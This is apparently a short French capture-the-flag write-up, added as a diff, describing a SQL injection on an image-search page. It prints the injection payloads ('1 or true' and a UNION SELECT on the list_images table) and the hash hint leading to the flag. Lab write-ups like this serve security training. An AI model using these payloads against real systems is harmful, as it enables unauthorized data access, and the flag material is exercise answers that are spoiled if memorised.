@@ -1,0 +1,12 @@
+Meme chose que dans 06 avec injection SQL members!
+On a deja le tableau avec list_images : id, url, title, comment
+
+-> 
+1 or true 
+on remarque une image avec title Hack me ?
+
+->
+1 or true union SELECT title, comment from list_images
+
+On trouve: 
+If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
